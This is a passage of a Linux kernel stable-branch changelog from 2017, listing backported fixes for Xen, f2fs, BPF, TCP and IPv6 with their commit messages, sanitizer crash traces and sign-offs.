established that commit 72a9b186292d ("xen: Remove event channel
notification through Xen PCI platform device") (and thus commit
da72ff5bfcb0 ("partially revert "xen: Remove event channel
notification through Xen PCI platform device"")) are unnecessary and,
in fact, prevent HVM guests from booting on Xen releases prior to 4.0
Therefore we revert both of those commits.
The summary of that discussion is below:
Here is the brief summary of the current situation:
Before the offending commit (72a9b186292):
1) INTx does not work because of the reset\_watches path.
2) The reset\_watches path is only taken if you have Xen > 4.0
3) The Linux Kernel by default will use vector inject if the hypervisor
support. So even INTx does not work no body running the kernel with
Xen > 4.0 would notice. Unless he explicitly disabled this feature
either in the kernel or in Xen (and this can only be disabled by
modifying the code, not user-supported way to do it).
After the offending commit (+ partial revert):
1) INTx is no longer support for HVM (only for PV guests).
2) Any HVM guest The kernel will not boot on Xen < 4.0 which does
not have vector injection support. Since the only other mode
supported is INTx which.
So based on this summary, I think before commit (72a9b186292) we were
in much better position from a user point of view.
Signed-off-by: Boris Ostrovsky
Reviewed-by: Juergen Gross
Cc: Boris Ostrovsky
Cc: Thomas Gleixner
Cc: Ingo Molnar
Cc: "H. Peter Anvin"
Cc: x86@kernel.org
Cc: Konrad Rzeszutek Wilk
Cc: Bjorn Helgaas
Cc: Stefano Stabellini
Cc: Julien Grall
Cc: Vitaly Kuznetsov
Cc: Paul Gortmaker
Cc: Ross Lagerwall
Cc: xen-devel@lists.xenproject.org
Cc: linux-kernel@vger.kernel.org
Cc: linux-pci@vger.kernel.org
Cc: Anthony Liguori
Cc: KarimAllah Ahmed
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit 5e25479ea90cdcbbda6c9db789702bf258b411e9
Author: Stefano Stabellini
Date: Thu Apr 13 14:04:21 2017 -0700
xen/arm,arm64: fix xen\_dma\_ops after 815dd18 "Consolidate get\_dma\_ops..."
commit e058632670b709145730a134acc3f83f392f7aa7 upstream.
The following commit:
commit 815dd18788fe0d41899f51b91d0560279cf16b0d
Author: Bart Van Assche
Date: Fri Jan 20 13:04:04 2017 -0800
treewide: Consolidate get\_dma\_ops() implementations
rearranges get\_dma\_ops in a way that xen\_dma\_ops are not returned when
running on Xen anymore, dev->dma\_ops is returned instead (see
arch/arm/include/asm/dma-mapping.h:get\_arch\_dma\_ops and
include/linux/dma-mapping.h:get\_dma\_ops).
Fix the problem by storing dev->dma\_ops in dev\_archdata, and setting
dev->dma\_ops to xen\_dma\_ops. This way, xen\_dma\_ops is returned naturally
by get\_dma\_ops. The Xen code can retrieve the original dev->dma\_ops from
dev\_archdata when needed. It also allows us to remove \_\_generic\_dma\_ops
from common headers.
Signed-off-by: Stefano Stabellini
Tested-by: Julien Grall
Suggested-by: Catalin Marinas
Reviewed-by: Catalin Marinas
CC: linux@armlinux.org.uk
CC: catalin.marinas@arm.com
CC: will.deacon@arm.com
CC: boris.ostrovsky@oracle.com
CC: jgross@suse.com
CC: Julien Grall
Signed-off-by: Greg Kroah-Hartman
commit c7f765b5d6bda480ae1aa2bf5734c9613d851f5f
Author: Jin Qian
Date: Tue Apr 25 16:28:48 2017 -0700
f2fs: sanity check segment count
commit b9dd46188edc2f0d1f37328637860bb65a771124 upstream.
F2FS uses 4 bytes to represent block address. As a result, supported
size of disk is 16 TB and it equals to 16 \* 1024 \* 1024 / 2 segments.
Signed-off-by: Jin Qian
Signed-off-by: Jaegeuk Kim
Signed-off-by: Greg Kroah-Hartman
commit 275e2edbb8f1d13a58320cf205d710df70733fb5
Author: Jon Mason
Date: Mon May 8 17:48:35 2017 -0400
net: mdio-mux: bcm-iproc: call mdiobus\_free() in error path
[ Upstream commit 922c60e89d52730050c6ccca218bff40cc8bcd8e ]
If an error is encountered in mdio\_mux\_init(), the error path will call
mdiobus\_free(). Since mdiobus\_register() has been called prior to
mdio\_mux\_init(), the bus->state will not be MDIOBUS\_UNREGISTERED. This
causes a BUG\_ON() in mdiobus\_free(). To correct this issue, add an
error path for mdio\_mux\_init() which calls mdiobus\_unregister() prior to
mdiobus\_free().
Signed-off-by: Jon Mason
Fixes: 98bc865a1ec8 ("net: mdio-mux: Add MDIO mux driver for iProc SoCs")
Acked-by: Florian Fainelli
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit ced12308e58cc95002404b584fdc756a233581ab
Author: Daniel Borkmann
Date: Mon May 8 00:04:09 2017 +0200
bpf: don't let ldimm64 leak map addresses on unprivileged
[ Upstream commit 0d0e57697f162da4aa218b5feafe614fb666db07 ]
The patch fixes two things at once:
1) It checks the env->allow\_ptr\_leaks and only prints the map address to
the log if we have the privileges to do so, otherwise it just dumps 0
as we would when kptr\_restrict is enabled on %pK. Given the latter is
off by default and not every distro sets it, I don't want to rely on
this, hence the 0 by default for unprivileged.
2) Printing of ldimm64 in the verifier log is currently broken in that
we don't print the full immediate, but only the 32 bit part of the
first insn part for ldimm64. Thus, fix this up as well; it's okay to
access, since we verified all ldimm64 earlier already (including just
constants) through replace\_map\_fd\_with\_map\_ptr().
Fixes: 1be7f75d1668 ("bpf: enable non-root eBPF programs")
Fixes: cbd357008604 ("bpf: verifier (add ability to receive verification log)")
Reported-by: Jann Horn
Signed-off-by: Daniel Borkmann
Acked-by: Alexei Starovoitov
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 7a0a483ec578b51570e22d488cb2bb6be62d4fdb
Author: Dan Carpenter
Date: Sat May 6 03:49:01 2017 +0300
bnxt\_en: allocate enough space for ->ntp\_fltr\_bmap
[ Upstream commit ac45bd93a5035c2f39c9862b8b6ed692db0fdc87 ]
We have the number of longs, but we need to calculate the number of
bytes required.
Fixes: c0c050c58d84 ("bnxt\_en: New Broadcom ethernet driver.")
Signed-off-by: Dan Carpenter
Acked-by: Michael Chan
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit f8e3892f9f237b96dcba5560d2050bffcbfdbb32
Author: Eric Dumazet
Date: Fri May 5 06:56:54 2017 -0700
tcp: randomize timestamps on syncookies
[ Upstream commit 84b114b98452c431299d99c135f751659e517acb ]
Whole point of randomization was to hide server uptime, but an attacker
can simply start a syn flood and TCP generates 'old style' timestamps,
directly revealing server jiffies value.
Also, TSval sent by the server to a particular remote address vary
depending on syncookies being sent or not, potentially triggering PAWS
drops for innocent clients.
Lets implement proper randomization, including for SYNcookies.
Also we do not need to export sysctl\_tcp\_timestamps, since it is not
used from a module.
In v2, I added Florian feedback and contribution, adding tsoff to
tcp\_get\_cookie\_sock().
v3 removed one unused variable in tcp\_v4\_connect() as Florian spotted.
Fixes: 95a22caee396c ("tcp: randomize tcp timestamp offsets for each connection")
Signed-off-by: Eric Dumazet
Reviewed-by: Florian Westphal
Tested-by: Florian Westphal
Cc: Yuchung Cheng
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 3960afa2e02f86463e893d0d5583b1e612f6f1ea
Author: WANG Cong
Date: Mon May 8 10:12:13 2017 -0700
ipv6: reorder ip6\_route\_dev\_notifier after ipv6\_dev\_notf
[ Upstream commit 242d3a49a2a1a71d8eb9f953db1bcaa9d698ce00 ]
For each netns (except init\_net), we initialize its null entry
in 3 places:
1) The template itself, as we use kmemdup()
2) Code around dst\_init\_metrics() in ip6\_route\_net\_init()
3) ip6\_route\_dev\_notify(), which is supposed to initialize it after
loopback registers
Unfortunately the last one still happens in a wrong order because
we expect to initialize net->ipv6.ip6\_null\_entry->rt6i\_idev to
net->loopback\_dev's idev, thus we have to do that after we add
idev to loopback. However, this notifier has priority == 0 same as
ipv6\_dev\_notf, and ipv6\_dev\_notf is registered after
ip6\_route\_dev\_notifier so it is called actually after
ip6\_route\_dev\_notifier. This is similar to commit 2f460933f58e
("ipv6: initialize route null entry in addrconf\_init()") which
fixes init\_net.
Fix it by picking a smaller priority for ip6\_route\_dev\_notifier.
Also, we have to release the refcnt accordingly when unregistering
loopback\_dev because device exit functions are called before subsys
exit functions.
Acked-by: David Ahern
Tested-by: David Ahern
Signed-off-by: Cong Wang
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 5ee83127ac04d1d36f79c714c8342fc5f316ae60
Author: WANG Cong
Date: Wed May 3 22:07:31 2017 -0700
ipv6: initialize route null entry in addrconf\_init()
[ Upstream commit 2f460933f58eee3393aba64f0f6d14acb08d1724 ]
Andrey reported a crash on init\_net.ipv6.ip6\_null\_entry->rt6i\_idev
since it is always NULL.
This is clearly wrong, we have code to initialize it to loopback\_dev,
unfortunately the order is still not correct.
loopback\_dev is registered very early during boot, we lose a chance
to re-initialize it in notifier. addrconf\_init() is called after
ip6\_route\_init(), which means we have no chance to correct it.
Fix it by moving this initialization explicitly after
ipv6\_add\_dev(init\_net.loopback\_dev) in addrconf\_init().
Reported-by: Andrey Konovalov
Signed-off-by: Cong Wang
Tested-by: Andrey Konovalov
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 0913e5733167f958114327975898ea356161febc
Author: Michal Schmidt
Date: Thu May 4 16:48:58 2017 +0200
rtnetlink: NUL-terminate IFLA\_PHYS\_PORT\_NAME string
[ Upstream commit 77ef033b687c3e030017c94a29bf6ea3aaaef678 ]
IFLA\_PHYS\_PORT\_NAME is a string attribute, so terminate it with \0.
Otherwise libnl3 fails to validate netlink messages with this attribute.
"ip -detail a" assumes too that the attribute is NUL-terminated when
printing it. It often was, due to padding.
I noticed this as libvirtd failing to start on a system with sfc driver
after upgrading it to Linux 4.11, i.e. when sfc added support for
phys\_port\_name.
Signed-off-by: Michal Schmidt
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 165a007e51f0f8b93c6a83f80f261b020bb9dffe
Author: Alexander Potapenko
Date: Wed May 3 17:06:58 2017 +0200
ipv4, ipv6: ensure raw socket message is big enough to hold an IP header
[ Upstream commit 86f4c90a1c5c1493f07f2d12c1079f5bf01936f2 ]
raw\_send\_hdrinc() and rawv6\_send\_hdrinc() expect that the buffer copied
from the userspace contains the IPv4/IPv6 header, so if too few bytes are
copied, parts of the header may remain uninitialized.
This bug has been detected with KMSAN.
For the record, the KMSAN report:
==================================================================
BUG: KMSAN: use of unitialized memory in nf\_ct\_frag6\_gather+0xf5a/0x44a0
inter: 0
CPU: 0 PID: 1036 Comm: probe Not tainted 4.11.0-rc5+ #2455
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:16
dump\_stack+0x143/0x1b0 lib/dump\_stack.c:52
kmsan\_report+0x16b/0x1e0 mm/kmsan/kmsan.c:1078
\_\_kmsan\_warning\_32+0x5c/0xa0 mm/kmsan/kmsan\_instr.c:510
nf\_ct\_frag6\_gather+0xf5a/0x44a0 net/ipv6/netfilter/nf\_conntrack\_reasm.c:577
ipv6\_defrag+0x1d9/0x280 net/ipv6/netfilter/nf\_defrag\_ipv6\_hooks.c:68
nf\_hook\_entry\_hookfn ./include/linux/netfilter.h:102
nf\_hook\_slow+0x13f/0x3c0 net/netfilter/core.c:310
nf\_hook ./include/linux/netfilter.h:212
NF\_HOOK ./include/linux/netfilter.h:255
rawv6\_send\_hdrinc net/ipv6/raw.c:673
rawv6\_sendmsg+0x2fcb/0x41a0 net/ipv6/raw.c:919
inet\_sendmsg+0x3f8/0x6d0 net/ipv4/af\_inet.c:762
sock\_sendmsg\_nosec net/socket.c:633
sock\_sendmsg net/socket.c:643
SYSC\_sendto+0x6a5/0x7c0 net/socket.c:1696
SyS\_sendto+0xbc/0xe0 net/socket.c:1664
do\_syscall\_64+0x72/0xa0 arch/x86/entry/common.c:285
entry\_SYSCALL64\_slow\_path+0x25/0x25 arch/x86/entry/entry\_64.S:246
RIP: 0033:0x436e03
RSP: 002b:00007ffce48baf38 EFLAGS: 00000246 ORIG\_RAX: 000000000000002c
RAX: ffffffffffffffda RBX: 00000000004002b0 RCX: 0000000000436e03
RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000003
RBP: 00007ffce48baf90 R08: 00007ffce48baf50 R09: 000000000000001c
R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000000
R13: 0000000000401790 R14: 0000000000401820 R15: 0000000000000000
origin: 00000000d9400053
save\_stack\_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59
kmsan\_save\_stack\_with\_flags mm/kmsan/kmsan.c:362
kmsan\_internal\_poison\_shadow+0xb1/0x1a0 mm/kmsan/kmsan.c:257
kmsan\_poison\_shadow+0x6d/0xc0 mm/kmsan/kmsan.c:270
slab\_alloc\_node mm/slub.c:2735
\_\_kmalloc\_node\_track\_caller+0x1f4/0x390 mm/slub.c:4341
\_\_kmalloc\_reserve net/core/skbuff.c:138
\_\_alloc\_skb+0x2cd/0x740 net/core/skbuff.c:231
alloc\_skb ./include/linux/skbuff.h:933
alloc\_skb\_with\_frags+0x209/0xbc0 net/core/skbuff.c:4678
sock\_alloc\_send\_pskb+0x9ff/0xe00 net/core/sock.c:1903
sock\_alloc\_send\_skb+0xe4/0x100 net/core/sock.c:1920
rawv6\_send\_hdrinc net/ipv6/raw.c:638
rawv6\_sendmsg+0x2918/0x41a0 net/ipv6/raw.c:919
inet\_sendmsg+0x3f8/0x6d0 net/ipv4/af\_inet.c:762
sock\_sendmsg\_nosec net/socket.c:633
sock\_sendmsg net/socket.c:643
SYSC\_sendto+0x6a5/0x7c0 net/socket.c:1696
SyS\_sendto+0xbc/0xe0 net/socket.c:1664
do\_syscall\_64+0x72/0xa0 arch/x86/entry/common.c:285
return\_from\_SYSCALL\_64+0x0/0x6a arch/x86/entry/entry\_64.S:246
==================================================================
, triggered by the following syscalls:
socket(PF\_INET6, SOCK\_RAW, IPPROTO\_RAW) = 3
sendto(3, NULL, 0, 0, {sa\_family=AF\_INET6, sin6\_port=htons(0), inet\_pton(AF\_INET6, "ff00::", &sin6\_addr), sin6\_flowinfo=0, sin6\_scope\_id=0}, 28) = -1 EPERM
A similar report is triggered in net/ipv4/raw.c if we use a PF\_INET socket
instead of a PF\_INET6 one.
Signed-off-by: Alexander Potapenko
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 86a9a0884d287a9417193179fcd10e7b63f136c2
Author: Eric Dumazet
Date: Wed May 3 06:39:31 2017 -0700
tcp: do not inherit fastopen\_req from parent
[ Upstream commit 8b485ce69876c65db12ed390e7f9c0d2a64eff2c ]
Under fuzzer stress, it is possible that a child gets a non NULL
fastopen\_req pointer from its parent at accept() time, when/if parent
morphs from listener to active session.
We need to make sure this can not happen, by clearing the field after
socket cloning.
BUG: Double free or freeing an invalid pointer
Unexpected shadow byte: 0xFB
CPU: 3 PID: 20933 Comm: syz-executor3 Not tainted 4.11.0+ #306
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs
01/01/2011
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:16 [inline]
dump\_stack+0x292/0x395 lib/dump\_stack.c:52
kasan\_object\_err+0x1c/0x70 mm/kasan/report.c:164
kasan\_report\_double\_free+0x5c/0x70 mm/kasan/report.c:185
kasan\_slab\_free+0x9d/0xc0 mm/kasan/kasan.c:580
slab\_free\_hook mm/slub.c:1357 [inline]
slab\_free\_freelist\_hook mm/slub.c:1379 [inline]
slab\_free mm/slub.c:2961 [inline]
kfree+0xe8/0x2b0 mm/slub.c:3882
tcp\_free\_fastopen\_req net/ipv4/tcp.c:1077 [inline]
tcp\_disconnect+0xc15/0x13e0 net/ipv4/tcp.c:2328
inet\_child\_forget+0xb8/0x600 net/ipv4/inet\_connection\_sock.c:898
inet\_csk\_reqsk\_queue\_add+0x1e7/0x250
net/ipv4/inet\_connection\_sock.c:928
tcp\_get\_cookie\_sock+0x21a/0x510 net/ipv4/syncookies.c:217
cookie\_v4\_check+0x1a19/0x28b0 net/ipv4/syncookies.c:384
tcp\_v4\_cookie\_check net/ipv4/tcp\_ipv4.c:1384 [inline]
tcp\_v4\_do\_rcv+0x731/0x940 net/ipv4/tcp\_ipv4.c:1421
tcp\_v4\_rcv+0x2dc0/0x31c0 net/ipv4/tcp\_ipv4.c:1715
ip\_local\_deliver\_finish+0x4cc/0xc20 net/ipv4/ip\_input.c:216
NF\_HOOK include/linux/netfilter.h:257 [inline]
ip\_local\_deliver+0x1ce/0x700 net/ipv4/ip\_input.c:257
dst\_input include/net/dst.h:492 [inline]
ip\_rcv\_finish+0xb1d/0x20b0 net/ipv4/ip\_input.c:396
NF\_HOOK include/linux/netfilter.h:257 [inline]
ip\_rcv+0xd8c/0x19c0 net/ipv4/ip\_input.c:487
\_\_netif\_receive\_skb\_core+0x1ad1/0x3400 net/core/dev.c:4210
\_\_netif\_receive\_skb+0x2a/0x1a0 net/core/dev.c:4248
process\_backlog+0xe5/0x6c0 net/core/dev.c:4868
napi\_poll net/core/dev.c:5270 [inline]
net\_rx\_action+0xe70/0x18e0 net/core/dev.c:5335
\_\_do\_softirq+0x2fb/0xb99 kernel/softirq.c:284
do\_softirq\_own\_stack+0x1c/0x30 arch/x86/entry/entry\_64.S:899

do\_softirq.part.17+0x1e8/0x230 kernel/softirq.c:328
do\_softirq kernel/softirq.c:176 [inline]
\_\_local\_bh\_enable\_ip+0x1cf/0x1e0 kernel/softirq.c:181
local\_bh\_enable include/linux/bottom\_half.h:31 [inline]
rcu\_read\_unlock\_bh include/linux/rcupdate.h:931 [inline]
ip\_finish\_output2+0x9ab/0x15e0 net/ipv4/ip\_output.c:230
ip\_finish\_output+0xa35/0xdf0 net/ipv4/ip\_output.c:316
NF\_HOOK\_COND include/linux/netfilter.h:246 [inline]
ip\_output+0x1f6/0x7b0 net/ipv4/ip\_output.c:404
dst\_output include/net/dst.h:486 [inline]
ip\_local\_out+0x95/0x160 net/ipv4/ip\_output.c:124
ip\_queue\_xmit+0x9a8/0x1a10 net/ipv4/ip\_output.c:503
tcp\_transmit\_skb+0x1ade/0x3470 net/ipv4/tcp\_output.c:1057
tcp\_write\_xmit+0x79e/0x55b0 net/ipv4/tcp\_output.c:2265
\_\_tcp\_push\_pending\_frames+0xfa/0x3a0 net/ipv4/tcp\_output.c:2450
tcp\_push+0x4ee/0x780 net/ipv4/tcp.c:683
tcp\_sendmsg+0x128d/0x39b0 net/ipv4/tcp.c:1342
inet\_sendmsg+0x164/0x5b0 net/ipv4/af\_inet.c:762
sock\_sendmsg\_nosec net/socket.c:633 [inline]
sock\_sendmsg+0xca/0x110 net/socket.c:643
SYSC\_sendto+0x660/0x810 net/socket.c:1696
SyS\_sendto+0x40/0x50 net/socket.c:1664
entry\_SYSCALL\_64\_fastpath+0x1f/0xbe
RIP: 0033:0x446059
RSP: 002b:00007faa6761fb58 EFLAGS: 00000282 ORIG\_RAX: 000000000000002c
RAX: ffffffffffffffda RBX: 0000000000000017 RCX: 0000000000446059
RDX: 0000000000000001 RSI: 0000000020ba3fcd RDI: 0000000000000017
RBP: 00000000006e40a0 R08: 0000000020ba4ff0 R09: 0000000000000010
R10: 0000000020000000 R11: 0000000000000282 R12: 0000000000708150
R13: 0000000000000000 R14: 00007faa676209c0 R15: 00007faa67620700
Object at ffff88003b5bbcb8, in cache kmalloc-64 size: 64
Allocated:
PID = 20909
save\_stack\_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59
save\_stack+0x43/0xd0 mm/kasan/kasan.c:513
set\_track mm/kasan/kasan.c:525 [inline]
kasan\_kmalloc+0xad/0xe0 mm/kasan/kasan.c:616
kmem\_cache\_alloc\_trace+0x82/0x270 mm/slub.c:2745
kmalloc include/linux/slab.h:490 [inline]
kzalloc include/linux/slab.h:663 [inline]
tcp\_sendmsg\_fastopen net/ipv4/tcp.c:1094 [inline]
tcp\_sendmsg+0x221a/0x39b0 net/ipv4/tcp.c:1139
inet\_sendmsg+0x164/0x5b0 net/ipv4/af\_inet.c:762
sock\_sendmsg\_nosec net/socket.c:633 [inline]
sock\_sendmsg+0xca/0x110 net/socket.c:643
SYSC\_sendto+0x660/0x810 net/socket.c:1696
SyS\_sendto+0x40/0x50 net/socket.c:1664
entry\_SYSCALL\_64\_fastpath+0x1f/0xbe
Freed:
PID = 20909
save\_stack\_trace+0x16/0x20 arch/x86/kernel/stacktrace.c:59
save\_stack+0x43/0xd0 mm/kasan/kasan.c:513
set\_track mm/kasan/kasan.c:525 [inline]
kasan\_slab\_free+0x73/0xc0 mm/kasan/kasan.c:589
slab\_free\_hook mm/slub.c:1357 [inline]
slab\_free\_freelist\_hook mm/slub.c:1379 [inline]
slab\_free mm/slub.c:2961 [inline]
kfree+0xe8/0x2b0 mm/slub.c:3882
tcp\_free\_fastopen\_req net/ipv4/tcp.c:1077 [inline]
tcp\_disconnect+0xc15/0x13e0 net/ipv4/tcp.c:2328
\_\_inet\_stream\_connect+0x20c/0xf90 net/ipv4/af\_inet.c:593
tcp\_sendmsg\_fastopen net/ipv4/tcp.c:1111 [inline]
tcp\_sendmsg+0x23a8/0x39b0 net/ipv4/tcp.c:1139
inet\_sendmsg+0x164/0x5b0 net/ipv4/af\_inet.c:762
sock\_sendmsg\_nosec net/socket.c:633 [inline]
sock\_sendmsg+0xca/0x110 net/socket.c:643
SYSC\_sendto+0x660/0x810 net/socket.c:1696
SyS\_sendto+0x40/0x50 net/socket.c:1664
entry\_SYSCALL\_64\_fastpath+0x1f/0xbe
Fixes: e994b2f0fb92 ("tcp: do not lock listener to process SYN packets")
Fixes: 7db92362d2fe ("tcp: fix potential double free issue for fastopen\_req")
Signed-off-by: Eric Dumazet
Reported-by: Andrey Konovalov
Acked-by: Wei Wang
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 0b1d889cb0c9ebc706e459d459822f7a38cc88ae
Author: Daniele Palmas
Date: Wed May 3 10:30:11 2017 +0200
net: usb: qmi\_wwan: add Telit ME910 support
[ Upstream commit 4c54dc0277d0d55a9248c43aebd31858f926a056 ]
This patch adds support for Telit ME910 PID 0x1100.
Signed-off-by: Daniele Palmas
Acked-by: Bjørn Mork
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 23e761f37b4fa1c6420c5d72a56fd63d575dc4c0
Author: David Ahern
Date: Tue May 2 14:43:44 2017 -0700
net: ipv6: Do not duplicate DAD on link up
[ Upstream commit 6d717134a1a6e1b34a7d0d70e953037bc2642046 ]
Andrey reported a warning triggered by the rcu code:
------------[ cut here ]------------
WARNING: CPU: 1 PID: 5911 at lib/debugobjects.c:289
debug\_print\_object+0x175/0x210
ODEBUG: activate active (active state 1) object type: rcu\_head hint:
(null)
Modules linked in:
CPU: 1 PID: 5911 Comm: a.out Not tainted 4.11.0-rc8+ #271
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011
Call Trace:
\_\_dump\_stack lib/dump\_stack.c:16
dump\_stack+0x192/0x22d lib/dump\_stack.c:52
\_\_warn+0x19f/0x1e0 kernel/panic.c:549
warn\_slowpath\_fmt+0xe0/0x120 kernel/panic.c:564
debug\_print\_object+0x175/0x210 lib/debugobjects.c:286
debug\_object\_activate+0x574/0x7e0 lib/debugobjects.c:442
debug\_rcu\_head\_queue kernel/rcu/rcu.h:75
\_\_call\_rcu.constprop.76+0xff/0x9c0 kernel/rcu/tree.c:3229
call\_rcu\_sched+0x12/0x20 kernel/rcu/tree.c:3288
rt6\_rcu\_free net/ipv6/ip6\_fib.c:158
rt6\_release+0x1ea/0x290 net/ipv6/ip6\_fib.c:188
fib6\_del\_route net/ipv6/ip6\_fib.c:1461
fib6\_del+0xa42/0xdc0 net/ipv6/ip6\_fib.c:1500
\_\_ip6\_del\_rt+0x100/0x160 net/ipv6/route.c:2174
ip6\_del\_rt+0x140/0x1b0 net/ipv6/route.c:2187
\_\_ipv6\_ifa\_notify+0x269/0x780 net/ipv6/addrconf.c:5520
addrconf\_ifdown+0xe60/0x1a20 net/ipv6/addrconf.c:3672
...
Andrey's reproducer program runs in a very tight loop, calling
'unshare -n' and then spawning 2 sets of 14 threads running random ioctl
calls. The relevant networking sequence:
1. New network namespace created via unshare -n
- ip6tnl0 device is created in down state
2. address added to ip6tnl0
- equivalent to ip -6 addr add dev ip6tnl0 fd00::bb/1
- DAD is started on the address and when it completes the host
route is inserted into the FIB
3. ip6tnl0 is brought up
- the new fixup\_permanent\_addr function restarts DAD on the address
4. exit namespace
- teardown / cleanup sequence starts
- once in a blue moon, lo teardown appears to happen BEFORE teardown
of ip6tunl0
+ down on 'lo' removes the host route from the FIB since the dst->dev
for the route is loobback
+ host route added to rcu callback list
\* rcu callback has not run yet, so rt is NOT on the gc list so it has
NOT been marked obsolete
5. in parallel to 4. worker\_thread runs addrconf\_dad\_completed
- DAD on the address on ip6tnl0 completes
- calls ipv6\_ifa\_notify which inserts the host route
All of that happens very quickly. The result is that a host route that
has been deleted from the IPv6 FIB and added to the RCU list is re-inserted
into the FIB.
The exit namespace eventually gets to cleaning up ip6tnl0 which removes the
host route from the FIB again, calls the rcu function for cleanup -- and
triggers the double rcu trace.
The root cause is duplicate DAD on the address -- steps 2 and 3. Arguably,
DAD should not be started in step 2. The interface is in the down state,
so it can not really send out requests for the address which makes starting
DAD pointless.
Since the second DAD was introduced by a recent change, seems appropriate
to use it for the Fixes tag and have the fixup function only start DAD for
addresses in the PREDAD state which occurs in addrconf\_ifdown if the
address is retained.
Big thanks to Andrey for isolating a reliable reproducer for this problem.
Fixes: f1705ec197e7 ("net: ipv6: Make address flushing on ifdown optional")
Reported-by: Andrey Konovalov
Signed-off-by: David Ahern
Tested-by: Andrey Konovalov
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit a1baca92afd5c420fb854ed79cb8cd3d8be29fbb
Author: Eric Dumazet
Date: Mon May 1 15:29:48 2017 -0700
tcp: fix wraparound issue in tcp\_lp
[ Upstream commit a9f11f963a546fea9144f6a6d1a307e814a387e7 ]
Be careful when comparing tcp\_time\_stamp to some u32 quantity,
otherwise result can be surprising.
Fixes: 7c106d7e782b ("[TCP]: TCP Low Priority congestion control")
Signed-off-by: Eric Dumazet
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit f94cc32ccbbab581ffd116795ac76c8ae69b8f22
Author: Daniel Borkmann
Date: Tue May 2 20:34:54 2017 +0200
bpf, arm64: fix jit branch offset related to ldimm64
[ Upstream commit ddc665a4bb4b728b4e6ecec8db1b64efa9184b9c ]
When the instruction right before the branch destination is
a 64 bit load immediate, we currently calculate the wrong
jump offset in the ctx->offset[] array as we only account
one instruction slot for the 64 bit load immediate although
it uses two BPF instructions. Fix it up by setting the offset
into the right slot after we incremented the index.
Before (ldimm64 test 1):
[...]
00000020: 52800007 mov w7, #0x0 // #0
00000024: d2800060 mov x0, #0x3 // #3
00000028: d2800041 mov x1, #0x2 // #2
0000002c: eb01001f cmp x0, x1
00000030: 54ffff82 b.cs 0x00000020
00000034: d29fffe7 mov x7, #0xffff // #65535
00000038: f2bfffe7 movk x7, #0xffff, lsl #16
0000003c: f2dfffe7 movk x7, #0xffff, lsl #32
00000040: f2ffffe7 movk x7, #0xffff, lsl #48
00000044: d29dddc7 mov x7, #0xeeee // #61166
00000048: f2bdddc7 movk x7, #0xeeee, lsl #16
0000004c: f2ddddc7 movk x7, #0xeeee, lsl #32
00000050: f2fdddc7 movk x7, #0xeeee, lsl #48
[...]
After (ldimm64 test 1):
[...]
00000020: 52800007 mov w7, #0x0 // #0
00000024: d2800060 mov x0, #0x3 // #3
00000028: d2800041 mov x1, #0x2 // #2
0000002c: eb01001f cmp x0, x1
00000030: 540000a2 b.cs 0x00000044
00000034: d29fffe7 mov x7, #0xffff // #65535
00000038: f2bfffe7 movk x7, #0xffff, lsl #16
0000003c: f2dfffe7 movk x7, #0xffff, lsl #32
00000040: f2ffffe7 movk x7, #0xffff, lsl #48
00000044: d29dddc7 mov x7, #0xeeee // #61166
00000048: f2bdddc7 movk x7, #0xeeee, lsl #16
0000004c: f2ddddc7 movk x7, #0xeeee, lsl #32
00000050: f2fdddc7 movk x7, #0xeeee, lsl #48
[...]
Also, add a couple of test cases to make sure JITs pass
this test. Tested on Cavium ThunderX ARMv8. The added
test cases all pass after the fix.
Fixes: 8eee539ddea0 ("arm64: bpf: fix out-of-bounds read in bpf2a64\_offset()")
Reported-by: David S. Miller
Signed-off-by: Daniel Borkmann
Acked-by: Alexei Starovoitov
Cc: Xi Wang
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 34acfbf08cce238b79cfdc6c59a5fea020056c08
Author: Yonghong Song
Date: Sat Apr 29 22:52:42 2017 -0700
bpf: enhance verifier to understand stack pointer arithmetic
[ Upstream commit 332270fdc8b6fba07d059a9ad44df9e1a2ad4529 ]
llvm 4.0 and above generates the code like below:
....
440: (b7) r1 = 15
441: (05) goto pc+73
515: (79) r6 = \*(u64 \*)(r10 -152)
516: (bf) r7 = r10
517: (07) r7 += -112
518: (bf) r2 = r7
519: (0f) r2 += r1
520: (71) r1 = \*(u8 \*)(r8 +0)
521: (73) \*(u8 \*)(r2 +45) = r1
....
and the verifier complains "R2 invalid mem access 'inv'" for insn #521.
This is because verifier marks register r2 as unknown value after #519
where r2 is a stack pointer and r1 holds a constant value.
Teach verifier to recognize "stack\_ptr + imm" and
"stack\_ptr + reg with const val" as valid stack\_ptr with new offset.
Signed-off-by: Yonghong Song
Acked-by: Martin KaFai Lau
Acked-by: Daniel Borkmann
Signed-off-by: Alexei Starovoitov
Signed-off-by: David S. Miller
Signed-off-by: Greg Kroah-Hartman
commit 5a5b34164f93d5cb002a9eb6a9a8024e24e5e299
Author: Girish Moodalbail
Date: Thu Apr 27 14:11:53 2017 -0700
geneve: fix incorrect setting of UDP checksum flag
[ Upstream commit 5e0740c445e6ae4026f5e52456ff8d0be9725183 ]
